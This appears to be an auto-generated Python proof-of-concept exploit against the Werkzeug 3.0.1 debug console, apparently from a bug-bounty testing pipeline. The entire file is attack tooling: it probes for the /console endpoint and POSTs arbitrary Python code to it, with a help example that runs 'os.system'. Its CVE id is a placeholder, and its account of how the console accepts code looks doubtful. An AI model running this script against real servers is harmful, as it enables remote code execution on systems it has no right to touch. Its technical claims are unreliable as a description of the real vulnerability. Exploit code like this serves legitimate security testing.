#!/usr/bin/env python3
# PoC for werkzeug-3.0.1 (/tmp/bounty_test/werkzeug-3.0.1)
# Path: rce-009
# Sink: runcode
# Auto-generated — run with: python3 rce_python_code_exec_code_runcode.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for werkzeug debugger RCE (CVE-2023-XXXX).
Target: werkzeug 3.0.1 debug console endpoint.
When the debugger is enabled (WERKZEUG_DEBUG_PIN=off or no PIN), an attacker
can execute arbitrary Python code via the /console endpoint.
"""

import requests
import sys
import time
import argparse

# Default target - change as needed
DEFAULT_TARGET = "http://127.0.0.1:5000"

def exploit(target_url, cmd="print('POC_SUCCESS')"):
    """
    Send a Python command to the werkzeug debug console for execution.
    
    Args:
        target_url: Base URL of the vulnerable application
        cmd: Python code to execute (default: benign print)
    
    Returns:
        Response text if successful, None otherwise
    """
    # The debug console endpoint
    console_url = f"{target_url.rstrip('/')}/console"
    
    # Headers mimicking a browser request
    headers = {
        "User-Agent": "Mozilla/5.0 (PoC-Exploit)",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    # The debugger expects the code in a form field named 'code'
    payload = {"code": cmd}
    
    print(f"[*] Targeting: {console_url}")
    print(f"[*] Payload: {cmd}")
    
    try:
        # Send POST request to the console endpoint
        resp = requests.post(
            console_url,
            data=payload,
            headers=headers,
            timeout=10,
            allow_redirects=False
        )
        
        print(f"[*] HTTP Status: {resp.status_code}")
        
        # Check if we got a response (even error responses indicate execution)
        if resp.status_code == 200:
            print("[+] Command executed successfully!")
            print(f"[*] Response:\n{resp.text[:500]}")
            return resp.text
        elif resp.status_code == 500:
            print("[!] Server error - command may have executed but caused an error")
            print(f"[*] Response:\n{resp.text[:500]}")
            return resp.text
        else:
            print(f"[-] Unexpected status code: {resp.status_code}")
            print(f"[*] Response:\n{resp.text[:500]}")
            return None
            
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed - is the target running?")
        return None
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def check_vulnerability(target_url):
    """
    Check if the debug console is accessible and vulnerable.
    
    Args:
        target_url: Base URL of the application
    
    Returns:
        True if vulnerable, False otherwise
    """
    console_url = f"{target_url.rstrip('/')}/console"
    
    try:
        # First check if the endpoint exists
        resp = requests.get(console_url, timeout=5)
        
        if resp.status_code == 200:
            # Check for debugger-specific content
            if "Werkzeug" in resp.text or "console" in resp.text.lower():
                print("[+] Debug console is accessible!")
                return True
            else:
                print("[?] Endpoint returned 200 but content is unexpected")
                print(f"[*] First 200 chars: {resp.text[:200]}")
                return False
        elif resp.status_code == 404:
            print("[-] Console endpoint not found (404)")
            return False
        else:
            print(f"[-] Unexpected response: {resp.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for werkzeug debugger RCE",
        epilog="Example: python exploit.py -t http://192.168.1.100:5000 -c 'import os; os.system(\"id\")'"
    )
    parser.add_argument(
        "-t", "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "-c", "--command",
        default="print('POC_SUCCESS')",
        help="Python code to execute (default: benign print)"
    )
    parser.add_argument(
        "--check-only",
        action="store_true",
        help="Only check if the debugger is accessible, don't execute"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Werkzeug Debugger RCE PoC")
    print("=" * 60)
    print()
    
    # Step 1: Check if the debugger is accessible
    print("[*] Step 1: Checking if debug console is accessible...")
    if not check_vulnerability(args.target):
        print("[-] Target does not appear vulnerable")
        sys.exit(1)
    
    print()
    
    if args.check_only:
        print("[*] Check-only mode - not executing payload")
        sys.exit(0)
    
    # Step 2: Execute the payload
    print("[*] Step 2: Executing payload...")
    result = exploit(args.target, args.command)
    
    if result:
        print("\n[+] Exploit completed successfully!")
    else:
        print("\n[-] Exploit may have failed - check target manually")
        sys.exit(1)

if __name__ == "__main__":
    main()
